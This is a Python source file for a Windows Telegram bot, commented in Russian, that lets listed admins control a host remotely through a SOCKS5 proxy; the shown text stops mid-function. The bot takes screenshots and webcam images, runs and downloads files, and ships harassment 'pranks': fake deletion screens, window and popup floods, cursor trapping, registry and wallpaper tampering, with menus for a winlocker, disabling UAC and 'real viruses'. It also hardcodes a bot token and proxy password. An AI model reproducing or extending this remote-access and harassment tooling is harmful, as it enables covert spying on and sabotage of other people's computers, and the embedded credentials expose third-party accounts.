# language: Python 3.11+, file: 12.py, target: Windows
# личный пульт v6 — СЛИЯНИЕ: каркас/меню/прокси/качалка из 1.py + АРСЕНАЛ приколов из 2.py
# сеть: весь трафик бота и вся качалка через socks5 (из 1.py)
# приколы: БСОД, фейк-апдейт, рикролл, наизнанку, блэк-аут, экран выкл, поворот,
#          фликер, танец окна, флуд cmd, окон-бомба, мышь (пьяная/центр/углы/клетка/swap),
#          CDROM, значки, обои (фото / скриншот / «Я ВСЁ ВИЖУ» / вернуть), блокноты,
#          мелодия, сирена, голос, громкость MAX, caps, плеер, WINLOCKER,
#          театр format C:, хакер, заряд 1%, скример, блок ПК, сарказм ×5,
#          конец света, СУДНАЯ НОЧЬ 2.0, Ctrl+Alt+Del прятки, UAC — всё тумблерами
# установка: pip install "python-telegram-bot[socks]>=21" pillow
import io, os, sys, html, socket, contextlib, datetime, subprocess, logging, asyncio, random, threading, time
import webbrowser, urllib.request, winreg, ctypes, uuid
from concurrent.futures import ThreadPoolExecutor
from ctypes import wintypes
from pathlib import Path
from urllib.parse import urlparse
import httpx
from PIL import ImageGrab, Image, ImageOps, ImageDraw, ImageFont
from PIL import ImageTk  # noqa: F401  (нужен для tk-оверлеев внутри прикалов)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

BOT_TOKEN  = "8669253902:AAE7nf8J9TqyT597EwsZyosmRHNRuQKoMyI"
ALLOWED_IDS: set[int] = {7352010946, 1885696985}
PROXY_URL  = "socks5://proxy_user:sP3HL0BCEJtfTdVq@194.87.55.223:42391"   # пусто = напрямую
DATA_DIR = Path(os.environ.get("LOCALAPPDATA", ".")) / "TelegramBot"
DATA_DIR.mkdir(exist_ok=True)

pending: dict[int, str] = {}
flood_stop: set[int] = set()
pranks_running: dict[str, bool] = {}

# ---------- выбор хоста: панель ОДНА, смена хоста внутри панели ----------
# /start сразу открывает ПАНЕЛЬ с уже выбранным хостом — никакого отдельного
# экрана выбора. хост = машина, где запущен ЭТОТ пульт (у одного токена
# физически один хост). тап «🛰 Сменить хоста» ПРАВИТ ту же панель в список
# хостов, тап по хосту правит её обратно в меню — сообщение всегда одно.
# своё имя переопределяется файлом host.cfg в %LOCALAPPDATA%\TelegramBot (первая строка),
# иначе берётся имя компьютера. HOST_TITLES — подписи, если хочется красивых имён.
HOST_TITLES: dict[str, str] = {
    # "имя машины": "подпись в меню",
}

def host_label() -> str:
    try:
        cfg = DATA_DIR / "host.cfg"
        if cfg.exists():
            lines = cfg.read_text(encoding="utf-8", errors="replace").strip().splitlines()
            if lines and lines[0].strip():
                return lines[0].strip()
    except Exception:
        pass
    return socket.gethostname() or "хост"

SESS: dict[str, str] = {}   # chat_id -> чей пульт открыт в этом чате
PANEL: dict[int, int] = {}  # chat_id -> message_id постоянной панели (всегда одно сообщение)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

RESCUE_POOL = ThreadPoolExecutor(max_workers=1, thread_name_prefix="rescue")

# отдельный пул: tk/модалки могут висеть подолгу — основной asyncio не трогаем
POOL = ThreadPoolExecutor(max_workers=4, thread_name_prefix="prank")

JOKES = [
    ("🥃", "Программист ставит на тумбочку два стакана: полный — если захочет пить ночью, и пустой — если не захочет."),
    ("🎃", "Почему программисты путают Хэллоуин и Рождество? Потому что OCT 31 == DEC 25."),
    ("🍺", "Заходит программист в бар. Бармен: «Что будете?» — «Ничего. У меня всё висит, самому разбираться надо.»"),
    ("🩹", "Учёные выяснили: 99% программистов испытывают боль, читая чужой код. Оставшийся 1% — те, кто его написал."),
    ("💾", "Windows напоминает: жизнь может закончиться раньше, чем вы сохраните файл."),
    ("🧪", "— Как называется программа, которую ни разу не тестировали? — «Готовая к релизу»."),
    ("🔗", "— У тебя есть знакомый программист? — Да, он мне даже прямую ссылку скидывал!"),
    ("🐛", "Настоящий программист считает, что задачи в мире бывают только двух видов: тривиальные и невозможные."),
    ("📅", "— Сколько времени займёт эта задача? — Две недели. — А если я помогу? — Четыре недели."),
]

def allowed(update) -> bool:
    u = update.effective_user
    return bool(u) and u.id in ALLOWED_IDS

# ---------- меню ----------
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton(t, callback_data=d) for t, d in row] for row in rows])

def menu_text(chat_id: int | None = None) -> str:
    now = datetime.datetime.now().strftime("%H:%M:%S")
    who = html.escape(SESS.get(chat_id) or host_label())
    return (f"🛠 <b>ПУЛЬТ · 👤 {who}</b>\n"
            f"🖥 {now} · жду команду\n"
            "Выбери, что сделать 👇")

ROWS_MAIN = [
    [("📸 Скриншот", "shot"), ("📊 Статус", "status")],
    [("🎥 Вебка", "webcam"), ("🚀 Запустить файл", "run")],
    [("📥 Скачать по ссылке", "dl"), ("📤 Загрузить файл", "upload")],
    [("🌆 Обои с фото", "wallpaper"), ("😂 Шутки", "jokes")],
    [("😈 Приколы", "pranks")],
    [("🛰 Сменить хоста", "whoami")],
]

def menu_kb() -> InlineKeyboardMarkup:
    return kb(*ROWS_MAIN)

# ---------- выбор хоста (внутри панели, не отдельным сообщением) ----------
def pick_text() -> str:
    return ("🛰 <b>ХОСТЫ ЭТОГО ПУЛЬТА</b>\n"
            "хост — машина, где запущен скрипт. тапни — панель будет его колбасить.\n"
            "если машин несколько: каждый свой токен на своей машине, все боты —\n"
            "в одну группу; каждый держит СВОЮ панель, /menu боится только чата")

def pick_kb() -> InlineKeyboardMarkup:
    known = [host_label()] + [n for n in HOST_TITLES if n != host_label()]
    rows = [[("🛰 " + HOST_TITLES.get(n, n), "hostsel:" + n)] for n in known]
    rows.append([("⬅️ Панель", "main")])
    return kb(*rows)

def joke_kb() -> InlineKeyboardMarkup:
    return kb([("🎲 Случайная шутка", "joke")], [("⬅️ Меню", "main")])

def pranks_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🪟 Экран и окна", "cat_screen"), ("🖱 Периферия", "cat_mouse")],
        [("🖥 Стол и темы", "cat_desktop"), ("🔊 Звук", "cat_sound")],
        [("🏴 Жёсткие (18+)", "cat_hard"), ("💀 КОМБО", "cat_combo")],
        [("🙈 Система-шутки", "cat_sys"), ("☠️ ВИРУСЫ (настоящие)", "cat_virus")],
        [("⬅️ Меню", "main")],
    )

def cat_screen_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🖥 БСОД", "pr_bsod"), ("💾 Фейк-апдейт", "pr_update")],
        [("🎵 Рикролл", "pr_rick"), ("🖼 Экран наизнанку", "pr_invert")],
        [("🖥 Блэк-аут", "pr_blackout"), ("📱 Экран выкл", "pr_monoff")],
        [("🔄 Экран на 90°", "pr_rotate"), ("🪟 Стол фликер", "pr_flicker")],
        [("🪟 Танцующее окно", "pr_dance"), ("⬅️ Приколы", "pranks")],
    )

def cat_mouse_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🍕 Флуд cmd", "floodcmd"), ("💬 Окон-бомба", "floodpop")],
        [("🌀 Мышь пьяная", "flooddrunk"), ("🧲 Мышь к центру", "pr_magnet")],
        [("🧲 Мышь от углов", "pr_edges"), ("🔒 Курсор в клетке", "pr_jail")],
        [("🙃 Мышь swap", "pr_swap"), ("💿 CDROM — открой!", "pr_cd")],
        [("⛔ Стоп безумия", "stopflood"), ("⬅️ Приколы", "pranks")],
    )

def cat_desktop_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🖼 Значки убрать/вернуть", "pr_icons"), ("🌆 Обои = скриншот", "pr_wallsub")],
        [("🖼 Обои «Я ВСЁ ВИЖУ»", "pr_wallstare"), ("🧷 Вернуть обои", "pr_wallback")],
        [("🗒 Блокнот-прикол", "pr_notepad"), ("⬅️ Приколы", "pranks")],
    )

def cat_sound_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🎵 Мелодия спикера", "pr_beep"), ("🎺 Сирена 15с", "pr_siren")],
        [("🗣 Голос из ниоткуда", "pr_voice"), ("🔊 Громкость MAX", "pr_volume")],
        [("⌨️ Caps-стрекот", "pr_caps"), ("▶️ Плеер дёргать", "pr_player")],
        [("⬅️ Приколы", "pranks")],
    )

def cat_hard_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🏴 WINLOCKER", "pr_winlock"), ("🧨 Театр format C:", "pr_format")],
        [("👁 Хакер-взлом", "pr_hacker"), ("🔋 Заряд 1%", "pr_battery")],
        [("🚨 Скример", "pr_screamer"), ("🖥 Блок ПК", "pr_lock")],
        [("💬 Сарказм ×5", "pr_msgbox"), ("⬅️ Приколы", "pranks")],
    )

def cat_combo_kb() -> InlineKeyboardMarkup:
    return kb(
        [("☠️ Конец света (КОМБО)", "pr_apocalypse")],
        [("💀 СУДНАЯ НОЧЬ 2.0", "pr_judgment")],
        [("⬅️ Приколы", "pranks")],
    )

def cat_sys_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🙈 Спрятать Ctrl+Alt+Del", "pr_hkhide"), ("🙈 Вернуть", "pr_hkshow")],
        [("🔒 UAC OFF", "pr_uacoff"), ("🔓 UAC ON", "pr_uacon")],
        [("⬅️ Приколы", "pranks")],
    )

def prompt_kb() -> InlineKeyboardMarkup:
    return kb([("✖️ Отмена", "cancel"), ("⬅️ Меню", "main")])

async def panel_edit(chat_id: int, ctx: ContextTypes.DEFAULT_TYPE,
                     mid: int, text: str, markup: InlineKeyboardMarkup) -> bool:
    try:
        await ctx.bot.edit_message_text(text, chat_id=chat_id, message_id=mid,
                                        reply_markup=markup, parse_mode="HTML")
        PANEL[chat_id] = mid
        return True
    except Exception:
        return False   # сообщение умерло/уплыло — панель переродится ниже

async def set_panel(chat_id: int, ctx: ContextTypes.DEFAULT_TYPE,
                    text: str, markup: InlineKeyboardMarkup):
    """одна панель на чат: правит ТУ ЖЕ панель, новое сообщение — только если старое померло"""
    mid = PANEL.get(chat_id)
    if mid and await panel_edit(chat_id, ctx, mid, text, markup):
        return
    m = await ctx.bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    PANEL[chat_id] = m.message_id

async def send_menu(chat_id: int, ctx: ContextTypes.DEFAULT_TYPE):
    await set_panel(chat_id, ctx, menu_text(chat_id), menu_kb())

# ---------- быт ----------
def launch_by_path(file_path: str) -> str:
    p = Path(file_path)
    if not p.is_file():
        return f"❌ файл не найден: {p}"
    if p.suffix.lower() == ".bat":
        subprocess.run(["cmd.exe", "/c", str(p)], check=True)
        return f"🚀 .bat исполнен: {p}"
    os.startfile(str(p))
    return f"🚀 запущено: {p}"

# ---------- инструменты прикалов (из 2.py) ----------
def press_key(vk: int, times: int = 1):
    user32 = ctypes.windll.user32
    for _ in range(times):
        user32.keybd_event(vk, 0, 0, 0)   # down
        user32.keybd_event(vk, 0, 2, 0)   # up
        time.sleep(0.01)

class _POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

def snapshot_webcams(max_cams: int = 5) -> list[tuple[int, bytes]]:
    """перебирает индексы камер, снимает кадр, возвращает (индекс, jpeg-байты)"""
    import cv2
    out: list[tuple[int, bytes]] = []
    for i in range(max_cams):
        cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)   # быстрый бэкенд, без MSMF-проверок
        if not cap.isOpened():
            continue
        frame = None
        for _ in range(4):                         # прогрев: первые кадры бывают чёрными
            got, fr = cap.read()
            if got and fr.mean() > 4:
                frame = fr
                break
            time.sleep(0.12)
        cap.release()
        if frame is None:
            continue
        ok, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        if ok:
            out.append((i, buf.tobytes()))
    return out

class _POINT_A(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class _RECT_A(ctypes.Structure):
    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]

class _KBDLLHOOK(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]

class _MSG_A(ctypes.Structure):
    class _PT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
    _fields_ = [("hwnd", wintypes.HWND), ("message", wintypes.UINT),
                ("wParam", wintypes.WPARAM), ("lParam", wintypes.LPARAM),
                ("time", wintypes.DWORD), ("pt", _PT)]

_KBDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                              wintypes.WPARAM, wintypes.LPARAM)

def prank_busy(jid: str) -> bool:
    if pranks_running.get(jid):
        return True
    pranks_running[jid] = True
    return False

# ---------- приколы: экран и окна ----------
def _bsod_worker():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#0078D7")
        root.focus_force()
        pct = {"v": 0}
        tk.Label(root, text="🙁", font=("Segoe UI Emoji", 120), fg="white", bg="#0078D7"
                 ).place(relx=0.18, rely=0.20, anchor="w")
        tk.Label(root, text="Система уничтожает пользовательские файлы.\nПожалуйста, не закрывайте окно.",
                 font=("Segoe UI", 18), fg="white", bg="#0078D7", justify="left"
                 ).place(relx=0.18, rely=0.40, anchor="w")
        pr = tk.Label(root, text="", font=("Segoe UI", 18), fg="white", bg="#0078D7")
        pr.place(relx=0.18, rely=0.54, anchor="w")
        cur = tk.Label(root, text="", font=("Consolas", 12), fg="#cfe2ff", bg="#0078D7")
        cur.place(relx=0.18, rely=0.65, anchor="w")
        VICTIMS = [
            r"Users\Пк\Documents\диплом_финал_финал2.docx",
            r"Users\Пк\Pictures\серия_лучших_селфи",
            r"Users\Пк\Documents\пароли_новые_не_удалил.txt",
            r"D:\архив\за_5_лет\всё_важное",
            r"Users\Пк\Music\плейлист_души",
            r"C:\Windows\System32\надеюсь_это_не_всё",
        ]
        def tick():
            if not root.winfo_exists():
                return
            pct["v"] = min(100, pct["v"] + random.randint(3, 11))
            pr.config(text=f"Уничтожено: {pct['v']}%")
            cur.config(text="удаляем: " + random.choice(VICTIMS))
            if pct["v"] >= 100:
                cur.config(text="шутка. файлы на месте. ESC выход")
                root.after(3500, root.destroy)
                return
            root.after(random.randint(400, 1000), tick)
        root.after(400, tick)
        root.bind("<Escape>", lambda e: root.destroy())
        root.bind("<Button-1>", lambda e: root.destroy())
        root.after(45000, root.destroy)
        root.mainloop()
    except Exception:
        pass

def _p_bsod() -> str:
    threading.Thread(target=_bsod_worker, daemon=True).start()
    return "🖥 синий гость делает вид, что стерёт твою жизнь (ESC выручает)"

def _fullscreen_window(bg: str, lines: list[tuple[str, int]], slow_pct: bool):
    def run():
        try:
            import tkinter as tk
            r = tk.Tk()
            r.attributes("-fullscreen", True)
            r.attributes("-topmost", True)
            r.overrideredirect(True)
            r.configure(bg=bg)
            frame = tk.Frame(r, bg=bg)
            frame.pack(expand=True)
            pct_lbl = None
            for txt, size in lines:
                w = tk.Label(frame, text=txt, bg=bg, fg="white", font=("Segoe UI", size, "bold"))
                w.pack(pady=6)
                if "%" in txt: pct_lbl = w
            if slow_pct:
                state = {"v": 0}
                def tick():
                    if not r.winfo_exists():
                        return
                    state["v"] += random.randint(0, 3)
                    if state["v"] > 90: state["v"] = 0        # прогресс снова в ноль — смех ART
                    if pct_lbl: pct_lbl.config(text=f"Выполнено: {state['v']}%")
                    r.after(2200, tick)
                tick()
            r.bind("<Escape>", lambda e: r.destroy())
            r.focus_force()
            r.mainloop()
        except Exception:
            pass
    threading.Thread(target=run, daemon=True).start()

def _p_update() -> str:
    _fullscreen_window("#003A6D", [
        ("Обновление Windows", 34), ("0% завершено", 20),
        ("Не выключайте компьютер", 13),
    ], slow_pct=True)
    return "🔄 фейк-обновление пошло — 0% может подняться до 90 и уйти снова в ноль (ESC — выход)"

def rickroll() -> str:
    url = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ"
    browsers = [
        (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "--edge-kiosk-type=fullscreen"),
        (r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",       "--edge-kiosk-type=fullscreen"),
        (r"C:\Program Files\Google\Chrome\Application\chrome.exe",        ""),
        (r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",  ""),
    ]
    for path, extra in browsers:
        if os.path.exists(path):
            args = [path, f"--kiosk={url}", "--autoplay-policy=no-user-gesture-required",
                    "--no-first-run", "--new-window"]
            if extra: args.append(extra)
            subprocess.Popen(args)
            return "🎵 рикролл на весь экран (выйти: Alt+F4)"
    os.startfile(url)
    return "🎵 рикролл открылся обычной вкладкой — киоска нет, но напряжение есть"

def _invert_worker():
    try:
        import tkinter as tk
        img = ImageGrab.grab(all_screens=True).convert("RGB")
        neg = ImageOps.invert(img)
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="black")
        w, h = root.winfo_screenwidth(), root.winfo_screenheight()
        photo = ImageTk.PhotoImage(neg.resize((w, h)))
        tk.Label(root, image=photo, border=0).place(x=0, y=0)
        root.focus_force()
        root.bind("<Escape>", lambda e: root.destroy())
        root.bind("<Button-1>", lambda e: root.destroy())
        root.after(15000, root.destroy)
        root.mainloop()
    except Exception:
        pass

def _p_invert() -> str:
    threading.Thread(target=_invert_worker, daemon=True).start()
    return "🖼 экран вывернулся наизнанку — вернётся через 15с (ESC — сразу)"

def _p_screamer() -> str:
    threading.Thread(target=_invert_worker, daemon=True).start()
    try:
        import winsound
        for f in (1800, 1300, 1800):
            winsound.Beep(f, 320)
    except Exception:
        pass
    return "🚨 скример ушёл: негатив + визг 3 секунды"

def _blackout_worker(mute_secs: int = 8, hint: str = ";) это шутка — ESC выручит"):
    deadline = time.time() + mute_secs
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="black")
        root.focus_force()
        lbl = tk.Label(root, text="", font=("Segoe UI", 44, "bold"),
                       fg="#c0392b", bg="black")
        lbl.place(relx=0.5, rely=0.5, anchor="center")
        sub = tk.Label(root, text="", font=("Consolas", 16), fg="#555555", bg="black")
        sub.place(relx=0.5, rely=0.62, anchor="center")
        def kill(e=None):
            if time.time() >= deadline:
                root.destroy()
        root.bind("<Button-1>", kill)
        root.bind("<Escape>", kill)
        root.after(mute_secs * 1000 + 1, lambda: lbl.config(text=hint))
        root.after(mute_secs * 1000 + 1200, lambda: sub.config(text="клик тоже работает"))
        root.after(20000, root.destroy)
        root.mainloop()
    except Exception:
        pass

def _p_blackout() -> str:
    threading.Thread(target=_blackout_worker, daemon=True).start()
    return "🖥 экран ушёл в чёрный — первые 8с без подсказок, 20с максимум"

def _p_monoff() -> str:
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    return "📱 экран выключен — шевельни мышью, чтобы вернуть"

def rotate_display() -> str:
    class DEVMODE(ctypes.Structure):
        _fields_ = [
            ("dmDeviceName", ctypes.c_wchar * 32), ("dmSpecVersion", ctypes.c_ushort),
            ("dmDriverVersion", ctypes.c_ushort), ("dmSize", ctypes.c_ushort),
            ("dmDriverExtra", ctypes.c_ushort), ("dmFields", ctypes.c_ulong),
            ("dmOrientation", ctypes.c_short), ("dmScale", ctypes.c_short),
            ("dmCopies", ctypes.c_short), ("dmDefaultSource", ctypes.c_short),
            ("dmPosition_x", ctypes.c_long), ("dmPosition_y", ctypes.c_long),
            ("dmDisplayOrientation", ctypes.c_ulong), ("dmDisplayFixedOutput", ctypes.c_ulong),
            ("dmFormName", ctypes.c_wchar * 32), ("dmLogPixels", ctypes.c_ushort),
            ("dmBitsPerPel", ctypes.c_ulong), ("dmPelsWidth", ctypes.c_ulong),
            ("dmPelsHeight", ctypes.c_ulong), ("dmDisplayFlags", ctypes.c_ulong),
            ("dmDisplayFrequency", ctypes.c_ulong),
        ]
    dm = DEVMODE()
    dm.dmSize = ctypes.sizeof(DEVMODE)
    if not ctypes.windll.user32.EnumDisplaySettingsW(None, -1, ctypes.byref(dm)):
        return "🖥 не поворачивается (драйвер запретил)"
    names = ["горизонтально", "на 90°", "вверх ногами", "на 270°"]
    dm.dmDisplayOrientation = (dm.dmDisplayOrientation + 1) % 4
    if ctypes.windll.user32.ChangeDisplaySettingsExW(None, ctypes.byref(dm), None, 0, None) == 0:
        return f"🖥 экран повернулся: {names[dm.dmDisplayOrientation]} (тапай ещё — вернётся)"
    return "🖥 не повернулся — драйвер запретил"

def _p_flicker() -> str:
    user32 = ctypes.windll.user32
    for _ in range(15):
        user32.keybd_event(0x5B, 0, 0, 0)     # LWIN down
        user32.keybd_event(0x44, 0, 0, 0)     # D down
        user32.keybd_event(0x44, 0, 2, 0)
        user32.keybd_event(0x5B, 0, 2, 0)
        time.sleep(0.3)
    return "🪟 рабочий стол моргал 15 раз"

def _p_dance() -> str:
    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    class RECT(ctypes.Structure):
        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                    ("r", ctypes.c_long), ("b", ctypes.c_long)]
    rc = RECT()
    user32.GetWindowRect(hwnd, ctypes.byref(rc))
    w, h = rc.r - rc.l, rc.b - rc.t
    try:
        for _ in range(60):
            user32.MoveWindow(hwnd, rc.l + random.randint(-120, 120),
                              rc.t + random.randint(-70, 70), w, h, True)
            time.sleep(0.08)
    finally:
        user32.MoveWindow(hwnd, rc.l, rc.t, w, h, True)
    return "🪟 окно потанцевало и вернулось на место"

# ---------- приколы: периферия ----------
async def prank_flood_task(uid: int, chat_id: int):
    i = 0
    while uid not in flood_stop:
        i += 1
        subprocess.Popen(f"start \"\" /MAX cmd /k \"title окно №{i} — привет от бота\"",
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await asyncio.sleep(0.35)

async def popup_bomb_task(uid: int, chat_id: int):
    popup = DATA_DIR / "popup.vbs"
    popup.write_text('x = MsgBox("Ваш скучный день закончился! Нажмите ок, если это правда", 64, "Окошко от бота")',
                     encoding="cp1251")
    while uid not in flood_stop:
        subprocess.Popen(["wscript", str(popup)], creationflags=subprocess.CREATE_NO_WINDOW)
        await asyncio.sleep(0.6)

async def mouse_drunk_task(uid: int, chat_id: int):
    p = _POINT_A()
    while uid not in flood_stop:
        ctypes.windll.user32.GetCursorPos(ctypes.byref(p))
        ctypes.windll.user32.SetCursorPos(p.x + random.randint(-45, 45), p.y + random.randint(-45, 45))
        await asyncio.sleep(0.1)

def _p_magnet() -> str:
    user32 = ctypes.windll.user32
    end = time.time() + 10
    cx, cy = user32.GetSystemMetrics(0) // 2, user32.GetSystemMetrics(1) // 2
    while time.time() < end:
        user32.SetCursorPos(cx, cy)
        time.sleep(0.15)
    return "🧲 мышь льнула к центру 10 секунд"

def _p_edges() -> str:
    user32 = ctypes.windll.user32
    end = time.time() + 15
    w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
    pt = _POINT_A()
    margin = 80
    while time.time() < end:
        user32.GetCursorPos(ctypes.byref(pt))
        if pt.x < margin or pt.x > w - margin or pt.y < margin or pt.y > h - margin:
            user32.SetCursorPos(w // 2 + random.randint(-120, 120),
                                h // 2 + random.randint(-90, 90))
        time.sleep(0.05)
    return "🧲 углы экрана были закрыты 15 секунд"

def _jail_worker(seconds: int = 20):
    """ClipCursor-клетка: курсор живёт в квадрате 56×56, ESC — ранний выход,
    watchdog вернёт ClipCursor(None) даже если всё рухнет"""
    user32 = ctypes.windll.user32
    pt = _POINT_A()
    user32.GetCursorPos(ctypes.byref(pt))
    cx, cy = max(80, pt.x), max(80, pt.y)
    half = 28
    box = _RECT_A(cx - half, cy - half, cx + half, cy + half)
    freed = threading.Event()

    def watchdog():
        freed.wait(timeout=seconds + 10)
        user32.ClipCursor(None)

    threading.Thread(target=watchdog, daemon=True).start()

    def render():
        try:
            import tkinter as tk
            jail = tk.Tk()
            jail.overrideredirect(True)
            jail.attributes("-topmost", True)
            size = half * 2
            jail.geometry(f"{size}x{size}+{cx - half}+{cy - half}")
            jail.configure(bg="#ff2b2b")
            tk.Label(jail, text="🔒\nЗАЛ", font=("Segoe UI Emoji", 16, "bold"),
                     fg="#ff2b2b", bg="#000000", justify="center"
                     ).pack(expand=True, fill="both")
            end = time.time() + seconds
            def tick():
                if time.time() >= end or freed.is_set() or (user32.GetAsyncKeyState(0x1B) & 0x0001):
                    jail.destroy()
                    return
                user32.ClipCursor(ctypes.byref(box))
                user32.SetCursorPos(cx + random.randint(-5, 5), cy + random.randint(-5, 5))
                jail.after(50, tick)
            tick()
            jail.mainloop()
        except Exception:
            pass
        finally:
            freed.set()
            user32.ClipCursor(None)

    threading.Thread(target=render, daemon=True).start()

def _p_jail() -> str:
    threading.Thread(target=_jail_worker, kwargs={"seconds": 20}, daemon=True).start()
    return "🔒 курсор в клетке 20с. держи ESC — вырвешься раньше"

def mouse_toggle() -> str:
    cur = bool(ctypes.windll.user32.GetSystemMetrics(23))
    new = not cur
    ctypes.windll.user32.SwapMouseButton(new)
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Mouse") as k:
        winreg.SetValueEx(k, "SwapMouseButton", 0, winreg.REG_SZ, "1" if new else "0")
    return "🙃 кнопки мыши поменялись местами" if new else "🙃 мышь вернулась в привычку"

def _p_cd() -> str:
    winmm = ctypes.windll.winmm
    buf = ctypes.create_unicode_buffer(256)
    if winmm.mciSendStringW("set cdaudio door open", buf, 256, 0) != 0:
        return "💿 привода нет — шутка не взлетела"
    time.sleep(2)
    winmm.mciSendStringW("set cdaudio door closed", buf, 256, 0)
    return "💿 привод открылся и захлопнулся обратно"

# ---------- приколы: стол и темы ----------
ADV_PATH = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"

def icons_toggle() -> str:
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, ADV_PATH) as k:
        try: cur = winreg.QueryValueEx(k, "HideIcons")[0]
        except FileNotFoundError: cur = 0
        new = not cur
        winreg.SetValueEx(k, "HideIcons", 0, winreg.REG_DWORD, 1 if new else 0)
    subprocess.Popen('taskkill /f /im explorer.exe && timeout /t 1 /nobreak >nul && start explorer.exe',
                     shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    return "🖼 значки рабочего стола исчезли — ищем" if new else "🖼 значки вернулись на место"

def _wall_get() -> str:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop") as k:
            return winreg.QueryValueEx(k, "Wallpaper")[0] or ""
    except Exception:
        return ""

def _wall_set(path: str):
    SPI_SETDESKWALLPAPER = 0x14
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

def _p_wallpaper() -> str:
    orig = _wall_get()
    marker = DATA_DIR / "orig_wall.txt"
    if orig and not marker.exists():
        marker.write_text(orig, encoding="utf-8")
    shot = ImageGrab.grab(all_screens=True).convert("RGB")
    fake = DATA_DIR / "fake_wall.png"
    shot.save(fake, "PNG")
    _wall_set(str(fake))
    return ("🖼 обои стали скриншотом экрана — рабочий стол выглядит живым, но не дышит. "
            "🧷 вернёт старые обои")

def _p_wallstare() -> str:
    orig = _wall_get()
    marker = DATA_DIR / "orig_wall.txt"
    if orig and not marker.exists():
        marker.write_text(orig, encoding="utf-8")
    shot = ImageGrab.grab(all_screens=True).convert("RGB")
    d = ImageDraw.Draw(shot)
    try:
        font = ImageFont.truetype("arialbd.ttf", 140)
    except Exception:
        font = ImageFont.load_default()
    d.text((shot.width // 2, 90), "Я ВСЁ ВИЖУ", anchor="mm",
           font=font, fill=(255, 30, 30))
    fake = DATA_DIR / "fake_wall.png"
    shot.save(fake, "PNG")
    _wall_set(str(fake))
    return "🖼 обои теперь со скриншотом и надписью «Я ВСЁ ВИЖУ» — 🧷 вернёт старые"

def _wall_restore() -> str:
    marker = DATA_DIR / "orig_wall.txt"
    if not marker.exists():
        return "🧷 оригинал не записывался — возвращать нечего"
    path = marker.read_text(encoding="utf-8").strip() or ""
    if not path or not Path(path).exists():
        return "🧷 файл старых обоев пропал — верни вручную (Правый клик → Персонализация)"
    _wall_set(path)
    marker.unlink()
    return "🧷 старые обои восстановлены"

def type_text(text: str):
    """печатает текст в активное окно через SendInput (unicode)"""
    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD),
                    ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]
    class INPUT(ctypes.Structure):
        class _I(ctypes.Union):
            _fields_ = [("ki", KEYBDINPUT), ("pad", ctypes.c_byte * 32)]
        _anonymous_ = ("i",)
        _fields_ = [("type", wintypes.DWORD), ("i", _I)]
    user32 = ctypes.windll.user32
    def send(chip: INPUT):
        user32.SendInput(1, ctypes.byref(chip), ctypes.sizeof(INPUT))
    for ch in text:
        inp = INPUT()
        inp.type = 1                                # INPUT_KEYBOARD
        if ch == "\n":
            inp.i.ki.wVk = 0x0D                     # RETURN
            send(inp)
            inp.i.ki.dwFlags = 2
            send(inp)
        else:
            inp.i.ki.wScan = ord(ch)
            inp.i.ki.dwFlags = 4                    # KEYEVENTF_UNICODE
            send(inp)
            inp.i.ki.dwFlags = 6                    # + KEYUP
            send(inp)
        time.sleep(0.004)

def _p_notepad() -> str:
    for i in range(3):
        subprocess.Popen("notepad.exe")
        time.sleep(1.2)
        type_text("это не баг — это шутка :)\nбудет весело, не выключай\n")
    return "🗒 3 блокнота выдали тайну"

def set_wallpaper(path: Path) -> str:
    SPI_SETDESKWALLPAPER = 20
